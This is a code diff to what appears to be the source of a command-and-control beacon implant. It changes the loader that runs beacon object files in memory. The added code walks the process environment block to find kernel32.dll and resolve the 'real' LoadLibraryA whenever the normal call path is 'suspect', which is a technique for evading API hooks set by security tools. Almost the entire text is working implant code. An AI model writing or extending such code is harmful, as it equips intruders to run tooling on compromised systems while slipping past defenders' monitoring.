@@ -501,6 +501,91 @@ static char * bof_cached;
 static SIZE_T bof_cached_size;
 static int    bof_cached_how;
 
+/* tier-2 item6: DYNAMICF import resolution must survive the boot context
+ * (udc2_init loads the UDC2 BOF before http_init). Resolve the real
+ * kernel32!LoadLibraryA through a PEB walk when the plain call path is
+ * suspect; kernel32/ntdll are always mapped, so the walk is safe in every
+ * beacon context. */
+static HMODULE bof_peb_kernel32(void) {
+	typedef struct _UNISTR_X { USHORT Length; USHORT Max; void * Buffer; } UNISTR_X;
+	typedef struct _LDRE_X {
+		LIST_ENTRY InLoadOrderLinks;
+		LIST_ENTRY InMemoryOrderLinks;
+		LIST_ENTRY InInitializationOrderLinks;
+		void * DllBase;
+		void * EntryPoint;
+		ULONG SizeOfImage;
+		UNISTR_X FullDllName;
+		UNISTR_X BaseDllName;
+	} LDRE_X;
+	typedef struct _PEB_LDR_X {
+		BYTE pad[0x10];
+		LIST_ENTRY InLoadOrderModuleList;
+	} PEB_LDR_X;
+	typedef struct _PEB_X {
+		BYTE pad[0x18];
+		void * Ldr;
+	} PEB_X;
+
+	PEB_X * peb;
+	PEB_LDR_X * ldr;
+	LIST_ENTRY * cur;
+	LDRE_X * ent;
+	const char * want = "kernel32.dll";
+	int i;
+
+#if defined _M_X64
+	peb = (PEB_X *)__readgsqword(0x60);
+#else
+	peb = (PEB_X *)(ULONG_PTR)__readfsdword(0x30);
+#endif
+	if (peb == NULL)
+		return NULL;
+	ldr = (PEB_LDR_X *)peb->Ldr;
+	if (ldr == NULL)
+		return NULL;
+
+	for (cur = ldr->InLoadOrderModuleList.Flink; cur != &ldr->InLoadOrderModuleList; cur = cur->Flink) {
+		ent = (LDRE_X *)cur;
+		if (ent->DllBase == NULL || ent->BaseDllName.Buffer == NULL)
+			continue;
+		if (ent->BaseDllName.Length < 24)
+			continue; /* shorter than "kernel32.dll" */
+		for (i = 0; i < 12; i++) {
+			wchar_t c = ((wchar_t *)ent->BaseDllName.Buffer)[i];
+			if (c >= L'A' && c <= L'Z')
+				c += 32;
+			if ((wchar_t)want[i] != c)
+				break;
+		}
+		if (i == 12)
+			return (HMODULE)ent->DllBase;
+	}
+	return NULL;
+}
+
+static HMODULE bof_real_LoadLibraryA(const char * lib) {
+	typedef HMODULE (WINAPI *fnLLA)(LPCSTR);
+	HMODULE k32;
+	fnLLA fn;
+
+	/* already mapped: cheap and safe */
+	k32 = GetModuleHandleA(lib);
+	if (k32 != NULL)
+		return k32;
+
+	/* boot-context-safe chain: PEB kernel32 -> real LoadLibraryA */
+	k32 = bof_peb_kernel32();
+	if (k32 == NULL)
+		k32 = GetModuleHandleA("kernel32.dll");
+	if (k32 == NULL)
+		return NULL;
+	fn = (fnLLA)GetProcAddress(k32, "LoadLibraryA");
+	if (fn == NULL)
+		return NULL;
+	return fn(lib);
+}
+
 BOOL command_inline_execute_object_parsed(char * objblob, int objlen, DWORD entry, char * args, int alen, int conv) {
 	datap parser;
 	datap relocsparser;
@@ -632,9 +717,7 @@ BOOL command_inline_execute_object_parsed(char * objblob, int objlen, DWORD entr
 			char * fun = data_string_asciiz(&relocsparser);
 			void * ptr;
 			void * slot;
-			HMODULE mod = GetModuleHandleA(lib);
-			if (mod == NULL)
-				mod = LoadLibraryA(lib);
+			HMODULE mod = bof_real_LoadLibraryA(lib);
 			ptr = GetProcAddress(mod, fun);
 			if (ptr == NULL) {
 				post_error(0x4c, "%s!%s", lib, fun);
